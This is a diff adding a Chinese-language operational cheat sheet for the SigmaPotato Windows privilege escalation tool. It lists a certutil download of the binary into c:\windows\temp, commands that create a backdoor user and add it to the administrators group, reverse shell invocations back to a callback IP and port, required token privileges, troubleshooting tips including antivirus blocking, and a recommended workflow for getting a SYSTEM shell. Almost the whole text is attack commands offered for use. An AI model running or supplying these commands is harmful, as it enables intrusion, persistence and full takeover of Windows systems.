@@ -1,0 +1,60 @@
+项目地址:https://github.com/tylerdotrar/SigmaPotato
+>下载
+certutil -urlcache -split -f $downloadurl c:\windows\temp\$badfile
+>测试
+c:\windows\temp\$badfile cmd /c whoami
+>添加用户
+c:\windows\temp\$badfile "net user test Test123! /add"
+>加入管理员组
+c:\windows\temp\$badfile "net localgroup administrators test /add"
+>反弹shell到回连端口（页面右上角可改）
+c:\windows\temp\$badfile --revshell $callback_ip $callback_port
+
+###
+基本用法（核心变化）：
+无需 -c 参数，直接传命令：
+SigmaPotato.exe <command>
+例如：
+SigmaPotato.exe whoami
+###
+
+###
+直接反弹 shell（内置功能）：
+--revshell <ip> <port>
+例如：
+SigmaPotato.exe --revshell 10.10.14.1 4444
+特点：
+- 内置 PowerShell 反弹
+- 不需要额外 payload
+- 更稳定（作者已优化）
+###
+
+
+###
+适用条件：
+需要具备以下权限之一：
+- SeImpersonatePrivilege
+- SeAssignPrimaryTokenPrivilege
+###
+
+###
+失败排查：
+1. 权限不足：
+   whoami /priv
+2. 参数错误：
+必须用引号包裹复杂命令
+3. 缺少参数：
+--revshell 必须提供 IP + PORT
+4. 杀软拦截：
+可能阻止 token impersonation 或 PowerShell payload
+###
+
+###
+推荐流程（实战）：
+1. 验证提权：
+   SigmaPotato.exe whoami
+2. 成功后：
+   直接使用 --revshell 获取 SYSTEM shell（首选）
+3. 或：
+   执行命令 / 添加用户
+###
